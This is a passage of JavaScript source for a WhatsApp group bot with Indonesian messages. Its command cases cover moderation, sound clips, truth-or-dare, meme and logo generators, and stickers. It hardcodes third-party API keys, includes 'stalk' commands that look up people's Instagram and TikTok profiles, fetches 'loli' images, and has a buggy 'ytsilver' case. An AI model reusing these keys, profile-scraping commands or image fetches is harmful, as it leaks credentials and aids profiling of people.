Hanz.sendMessage(from, enam, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound7':
tujuh = fs.readFileSync('./media/mp3/sound7.mp3');
Hanz.sendMessage(from, tujuh, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break	
case 'sound8':
delapan = fs.readFileSync('./media/mp3/sound8.mp3');
Hanz.sendMessage(from, delapan, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound9':
sembilan = fs.readFileSync('./media/mp3/sound9.mp3');
Hanz.sendMessage(from, sembilan, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound10':
sepuluh = fs.readFileSync('./media/mp3/sound10.mp3');
Hanz.sendMessage(from, sepuluh, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
//>>>>>>>>>>>>>>>>>>>>>>>>>[ ᖴITᑌᖇ ᘜᖇOᑌᑭ ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'welcome':
if (!isGroup) return replay(only.inGroup)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (Number(args[0]) === 1) {
if (isWelkom) return replyy('Udah aktif um')
_welkom.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
replyy('Sukses mengaktifkan fitur welcome di group ini ✔️')
} else if (Number(args[0]) === 0) {
_welkom.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
replyy('Sukses menonaktifkan fitur welcome di group ini ✔️')
} else {
sendButton(from, `MODE WELCOME`, `Silahkan pilih salah satu`, [
{
buttonId: `${prefix}welcome 1`,
buttonText: {
displayText: `ON`,
},
type: 1,
},
{
buttonId: `${prefix}welcome 0`,
buttonText: {
displayText: `OFF`,
},
type: 1,
},
]);
}
break;
case 'antilink' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
but = [
{ buttonId: '!antilinkon', buttonText: { displayText: 'On✔️' }, type: 1 },
{ buttonId: '!antilinkoff', buttonText: { displayText: 'off✖️' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antilink group", faketeks, but, mek)
break
case 'antilinkon' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
_antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
replyy(`\`\`\`✓Sukses mengaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antilinkoff' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)  
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (!isAntiLink) return replyy('anti link sudah off sebelumnya')
_antilink.splice(from, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
replyy(`\`\`\`✓Sukses menonaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtex' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
but = [
{ buttonId: '!antivirtexon', buttonText: { displayText: 'On✔️' }, type: 1 },
{ buttonId: '!antivirtexoff', buttonText: { displayText: 'Off✖️' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antivirtex group", faketeks, but, mek)
break
case 'listonline': 
if (!mek.key.fromMe && !isOwner) return replyy('Khusus Owner !!')
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(Hanz.chats.get(ido).presences), Hanz.user.jid]
Hanz.sendMessage(from, 'LIST ONLINE:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join`\n`, text, { quoted: fdoc,
contextInfo: { mentionedJid: online }
})			 
break
case 'antivirtexon' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (isAntiVirtex) return replyy('anti virtex group sudah aktif sebelumnya')
_antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
replyy(`\`\`\`Sukses mengaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtexoff' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (!isAntiVirtex) return replyy('Mode anti virtex sudah nonaktif sebelumnya')
_antivirtex.splice(from, 1)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
replyy(`\`\`\`✓Sukes menonaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'group' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})  
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
but = [
{ buttonId: '!groupbuka', buttonText: { displayText: 'Buka' }, type: 1 },
{ buttonId: '!grouptutup', buttonText: { displayText: 'Tutup' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk buka/tutup group", faketeks, but, mek)
break
case 'groupbuka' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
replyy(`\`\`\`✓Sukses Membuka Group\`\`\` *${groupMetadata.subject}*`)
Hanz.groupSettingChange(from, GroupSettingChange.messageSend, false)
break
case 'grouptutup' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
replyy(`\`\`\`✓Sukses Menutup Group\`\`\` *${groupMetadata.subject}*`)
Hanz.groupSettingChange(from, GroupSettingChange.messageSend, true)
break
case 'linkgrup' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
linkgc = await Hanz.groupInviteCode(from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
Hanz.sendMessage(from, yeh, text, { quoted: ftrol })
break										   		             
case 'promote' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)  
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return replyy('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda menjdi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Hanz.groupMakeAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, @${mentioned[0].split('@')[0]} Kamu Menjadi Admin Di Group *${groupMetadata.subject}*`, mentioned, true)
Hanz.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from) 
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return replyy('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, anda tidak menjadi admin :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Hanz.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Perintah di terima, Menurunkan : @${mentioned[0].split('@')[0]} Menjadi Member`, mentioned, true)
Hanz.groupDemoteAdmin(from, mentioned)
}
break
case 'add' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (args.length < 1) return replyy('Yang mau di add siapa??')
if (args[0].startsWith('08')) return replyy('Gunakan kode negara Gan')
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
Hanz.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
replyy('Gagal menambahkan target, mungkin karena di private')
}
break
case 'kick' :
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return replyy('Tag target yang ingin di tendang!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Perintah di terima, mengeluarkan :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Hanz.groupRemove(from, mentioned)
} else {
mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
Hanz.groupRemove(from, mentioned)
}
break
case 'getpic': case 'getpp': case 'getprofile':{
if (!isGroup) return reply(mess.only.group)
reply(mess.wait)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
try {
pp = await Hanz.getProfilePicture(mentioned)
} catch {
pp = `${imagebb}`
}
buffer = await getBuffer(pp)
Hanz.sendMessage(from, buffer, image, {quoted: mek, caption: `*Profile Picture Of @${mentioned.split("@")[0]}*`, thumbnail: fakeimage, contextInfo:{mentionedJid:[mentioned]}})
}
break
case 'peson':
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
Hanz.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL);
break;
case 'pesoff':
if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return sticAdmin(from)
if (!isBotGroupAdmins) return sticNotAdmin(from)
Hanz.toggleDisappearingMessages(from, 0);
break;
//=======================================ᖴITᑌᖇ ՏTᗩᒪK===================================================//
case 'stalkig':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return replyy(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna_11`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/stalkig/${username}?apikey=${lolkey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.photo_profile)
ini_txt = `Username : ${ini_result.username}\n`
ini_txt += `Full Name : ${ini_result.fullname}\n`
ini_txt += `Posts : ${ini_result.posts}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
Hanz.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break
case 'stalktiktok':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return replyy(`Usernamenya Mana Tod\nContoh: ${prefix + command} Sandrinna`)
stalk_toktok = args[0]
get_result = await fetchJson(`https://api.lolhuman.xyz/api/stalktiktok/${stalk_toktok}?apikey=ikyy69`)
get_result = get_result.result
ini_txt = `Username : ${get_result.username}\n`
ini_txt += `Nickname : ${get_result.nickname}\n`
ini_txt += `Bio : ${get_result.nickname}\n`
ini_txt += `Followers : ${get_result.followers}\n`
ini_txt += `Followings : ${get_result.followings}\n`
ini_txt += `Likes : ${get_result.likes}\n`
ini_txt += `Video : ${get_result.video}\n`
pp_tt = await getBuffer(get_result.user_picture)
Hanz.sendMessage(from, pp_tt, image, { quoted: ftrol, caption: ini_txt })
break
case 'stalkgithub':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length == 0) return replyy(`Usernamenya Mana Tod\nContoh: ${prefix + command} wong_koclok_`)
username = args[0]
ini_result = await fetchJson(`https://api.lolhuman.xyz/api/github/${username}?apikey=${lolkey}`)
ini_result = ini_result.result
ini_buffer = await getBuffer(ini_result.avatar)
ini_txt = `Name : ${ini_result.name}\n`
ini_txt += `Link : ${ini_result.url}\n`
ini_txt += `Public Repo : ${ini_result.public_repos}\n`
ini_txt += `Public Gists : ${ini_result.public_gists}\n`
ini_txt += `Followers : ${ini_result.followers}\n`
ini_txt += `Following : ${ini_result.following}\n`
ini_txt += `Bio : ${ini_result.bio}`
Hanz.sendMessage(from, ini_buffer, image, { caption: ini_txt })
break
//============================ F U N  T I M E  M E N U =============================/
//================================================================================/
case 'trut':
case 'truth':
if (!isGroup) return replyy('KhususGrup')
const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
const ttrth = trut[Math.floor(Math.random() * trut.length)]
//truteh = await getBuffer(`https://a.uguu.se/qMMQeGOl.jpg`)
but = [{ buttonId: `${prefix}truth`, buttonText: { displayText: 'ᴛʀᴜᴛʜ' }, type: 1 }, { buttonId: `${prefix}dare`, buttonText: { displayText: 'ᴅᴀʀᴇ' }, type: 1 }]
sendButtonLocation(from, ttrth, 'GK JALANIN WAJIB DONATE',fakeimage, but, {quoted: mek})
break
case 'dare':
if (!isGroup) return replyy('KhususGrup')
const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "😎??" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
const der = dare[Math.floor(Math.random() * dare.length)]
//todz = await getBuffer(`https://a.uguu.se/qMMQeGOl.jpg`)
but = [{ buttonId: `${prefix}truth`, buttonText: { displayText: 'ᴛʀᴜᴛʜ' }, type: 1 }, { buttonId: `${prefix}dare`, buttonText: { displayText: 'ᴅᴀʀᴇ' }, type: 1 }]
sendButtonLocation(from, der, 'GK JALANIN WAJIB DONATE',fakeimage, but, {quoted: mek})
break
case 'darkjokes':
data = fs.readFileSync('./lib/darkjokes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
but = [
{ buttonId: '!darkjokes', buttonText: { displayText: 'メNEXTメ'}, type: 1 }
]
sendButImage(from, `AWOKWOK DARK COK`, "©HANZ々OFC彡", hasil, but)
break
case 'asupan':
data = fs.readFileSync('./lib/asupan.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
hasil = await getBuffer(randKey.result)
but = [
{ buttonId: '!asupan', buttonText: { displayText: 'メNEXTメ'}, type: 1 }
]
sendButVideo(from, `ASUPAN NYA KAK`, "Kalau Video Nya Ngebug Maklum Bot geje🗿", hasil, but)
break
case 'anime':
loli = fs.readFileSync('./lib/loli.js');
lolidata = JSON.parse(loli);
lolirand = Math.floor(Math.random() * lolidata.length);
lolikun = lolidata[lolirand];
hasil = await getBuffer(lolikun)
but = [
{ buttonId: '!anime', buttonText: { displayText: '𝑵𝑬𝑿メNEXTメ︎' }, type: 1 }
]
sendButImage(from, `RANDOM ANIME`, `${fake}`, hasil, but)
break
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ᑭOᑭ ᑕᗩT]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'car':
xm = await fetchJson(`https://api.popcat.xyz/car`)
intel = await getBuffer(xm.image)
anunya = xm.title
Hanz.sendMessage(from, intel, image, {quoted: mek, thumbnail: intel, caption: `${anunya}`})
break
case 'ssweb':
xm = await getBuffer(`https://api.popcat.xyz/screenshot?url=${q}`)
Hanz.sendMessage(from, xm, image, {quoted: mek, thumbnail: fakeimage})
break
case 'pooh':
if (args.length == 0) return replyy('text nya mana anjg')
argz = arg.split("|")
xm = await getBuffer(`https://api.popcat.xyz/pooh?text1=${argz[0]}&text2=${argz[1]}`)
Hanz.sendMessage(from, xm, image, {quoted: mek, caption: `${q}`, thumbnail: fakeimage})
break
case 'drake':
if (args.length == 0) return replyy('text nya mana anjg')
argz = arg.split("|")
xm = await getBuffer(`https://api.popcat.xyz/drake?text1=${argz[0]}&text2=${argz[1]}`)
Hanz.sendMessage(from, xm, image, {quoted: mek, caption: `${q}`, thumbnail: fakeimage})
break
case 'biden':
if (args.length == 0) return replyy('text nya mana anjg')
xm = await getBuffer(`https://api.popcat.xyz/biden?text=${q}`)
Hanz.sendMessage(from, xm, image, {quoted: mek, caption: `${q}`, thumbnail: fakeimage})
break
case 'fatcs':
if (args.length == 0) return replyy('text nya mana anjg')
xm = await getBuffer(`https://api.popcat.xyz/facts?text=${q}`)
Hanz.sendMessage(from, xm, image, {quoted: mek, caption: `${q}`, thumbnail: fakeimage})
break
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ᗰᗩKᗴᖇ ᗰᗴᑎᑌ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'nulis1':  
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} nama & kelas & nulis*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
var F3 = F.split("&")[2]; 
sticWait(from)
anu = await getBuffer(`https://api.xteam.xyz/magernulis?nama=${F1}&kelas=${F2}&text=${F3}&APIKEY=${xteam}`)
Hanz.sendMessage(from, anu, image, {caption: `Nih Kak`, quoted: floc})
break
case 'nulis2':  
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`) 
var F = body.slice(8)         
sticWait(from)
anu = await getBuffer(`https://api.xteam.xyz/magernulis2?text=${F}&APIKEY=${xteam}`)
Hanz.sendMessage(from, anu, image, {caption: `*Nih Kak!*`, quoted: floc}) 
break 
case 'nulis3': 
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} bot whatsapp*`) 
var F = body.slice(8)          
sticWait(from)
anu = await getBuffer(`https://api.xteam.xyz/magernulis6?text=${F}&APIKEY=${xteam}`)
Hanz.sendMessage(from, anu, image, {caption: `*Nih Kak!*`, quoted: floc}) 
break   
case 'memeindo':                     
anu = await fetchJson(`https://api.zeks.xyz/api/memeindo?apikey=apivinz`)
anu1 = await getBuffer(anu.result)
but = [
{ buttonId: '!memeindo', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `Awokawok😂`, `${fake}`, anu1, but)
break 
case 'jokes': 
anu = await fetchJson(`https://api.zeks.xyz/api/darkjokes?apikey=apivinz`)
anu1 = await getBuffer(anu.result)
but = [
{ buttonId: '!jokes', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `DARK COK`, `${fake}`, anu1, but)
break 
case 'tahta':
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Haris*`)
F = body.slice(7)
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/hartatahta?text=${F}&apikey=apivinz`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break
case 'neon2':
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Haris*`)
F = body.slice(7)
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=apivinz&text=${F}`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break 
case 'wall': 
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Haris*`)
F = body.slice(6)
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/breakwall?apikey=apivinz&text=${F}`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break   
case 'wolf':
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Haris*`)
F = body.slice(6)
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=apivinz&text1=rimurubotz&text2=${F}`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break 
case 'tfire':  
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Haris*`)
F = body.slice(7)
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/tfire?text=${F}&apikey=apivinz`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break                
case 'ytgold': 
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Haris*`)
F = body.slice(8)
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/gplaybutton?text=${F}&apikey=apivinz`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break
case 'ytsilver': 
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Haris*`)
mF = body.slice(10)
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/splaybutton?text=${F}&apikey=apivinz`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break
case 't3d': 
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Haris*`)
F = body.slice(5)
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/text3dbox?apikey=apivinz&text=${F}`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break
case 'logoa':  
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Hanz&Ganz*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/logoaveng?text1=${F1}&text2=${F2}&apikey=apivinz`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break
case 'pornhub':  
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Hanz&Ganz*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/phlogo?text1=${F1}&text2=${F2}&apikey=apivinz`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break
case 'marvel':  
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Hanz&Ganz*`)
var F = body.slice(8)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/marvellogo?text1=${F1}&text2=${F2}&apikey=apivinz`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break
case 'leavest':  
if (args.length < 1) return replyy(`[❗] CONTOH??\n*${prefix}${command} Haris*`)
F = body.slice(9)
sticWait(from)
anu = await getBuffer(`https://api.zeks.xyz/api/leavest?text=${F}&apikey=apivinz`)
Hanz.sendMessage(from, anu, image, {caption: `nihh kak`, quoted: floc})
break					
case 'fox':  
anu = await fetchJson(`https://some-random-api.ml/img/fox`)
anu1 = await getBuffer(anu.link)
but = [
{ buttonId: '!fox', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `FOX NYA KAK`, `${fake}`, anu1, but)
break      
case 'cat':  
anu = await fetchJson(`https://some-random-api.ml/img/cat`)
anu1 = await getBuffer(anu.link)
 but = [
{ buttonId: '!cat', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `MIRIP KAMU YA KAK`, `${fake}`, anu1, but)
break
case 'bird':  
anu = await fetchJson(`https://some-random-api.ml/img/birb`)
anu1 = await getBuffer(anu.link)
but = [
{ buttonId: '!bird', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `MIRIP KAMU YA KAK`, `${fake}`, anu1, but)
break
case 'koala':  
anu = await fetchJson(`https://some-random-api.ml/img/koala`)
anu1 = await getBuffer(anu.link)
but = [
{ buttonId: '!koala', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `MIRIP KAMU YA KAK`, `${fake}`, anu1, but)
break
case 'meme':  
anu = await fetchJson(`https://some-random-api.ml/meme`)
anu1 = await getBuffer(anu.image)
but = [
{ buttonId: '!meme', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `MEME😂`, `${fake}`, anu1, but)
break
case 'loli':
loli = await getBuffer(`http://hadi-api.herokuapp.com/api/loli`)
but = [
{ buttonId: '!loli', buttonText: { displayText: 'メNEXTメ' }, type: 1 }
]
sendButImage(from, `LOLI NYA KAK`, `${fake}`, loli, but)
break		
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ ᖴITᑌᖇ ՏTIᑕKᗴᖇ ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'smeme':
pe = args.join('')
            top = pe.split('|')[0]
            bottom = pe.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
owgi = await  Hanz.downloadAndSaveMediaMessage(ger)
anu = await imgbb("20a14861e4f7591f3dc52649cb07ae02", owgi)
tekks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${tekks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
replyy('Gunakan foto/stiker!')
}
break				
case 'stikerwm':
case 'stickerwm':
case 'swm':
var a = arg.split("|")[0];
var b = arg.split("|")[1];
if (isMedia && !mek.message.videoMessage || isQuotedImage ) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
media = await Hanz.downloadAndSaveMediaMessage(encmedia)
  await createExif(a,b)
  out = getRandom('.webp')
  ffmpeg(media)
 .on('error', (e) => {
  console.log(e)
